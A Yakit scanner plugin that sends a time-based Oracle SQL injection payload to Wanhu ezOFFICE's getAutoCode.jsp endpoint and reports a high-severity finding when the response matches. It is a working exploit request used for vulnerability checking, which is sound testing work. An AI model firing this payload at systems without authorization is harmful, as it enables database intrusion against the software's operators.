# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C5%29--+YJdO&field=field_name&tabName=tfield HTTP/1.1
Host: {{params(target)}}
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36

`


    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )


    if str.MatchAllOfSubString(rsp, 'bBZl'){
        yakit.Info("%v found 万户网络-ezOFFICE getAutoCode.jsp  SQL注入", addr)
        risk.NewRisk(
        addr,
        risk.title("万户网络-ezOFFICE getAutoCode.jsp  SQL注入"),
        risk.severity("high"),
        risk.titleVerbose("万户网络-ezOFFICE getAutoCode.jsp  SQL注入"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
